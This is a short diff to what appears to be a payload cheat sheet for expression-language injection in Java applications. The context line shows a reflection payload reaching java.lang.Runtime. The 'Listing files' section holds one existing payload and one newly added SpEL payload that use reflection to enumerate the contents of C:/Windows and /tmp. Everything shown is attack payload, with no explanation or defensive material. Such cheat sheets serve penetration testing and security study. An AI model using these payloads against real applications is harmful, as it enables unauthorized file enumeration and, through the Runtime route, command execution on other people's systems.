@@ -66,6 +66,7 @@ new java.lang.String("".class.forName("java.lang.Runtime").getMethod("getRuntime
 ## Listing files
 ```java
 "".getClass().forName("java.io.File").getConstructor("".getClass()).newInstance("C:/Windows").listFiles()
+T(java.util.Arrays).toString(''.getClass().forName('java.io.File').getConstructor(''.getClass()).newInstance('/tmp').listFiles())
 ```
 
 ### Notes about files
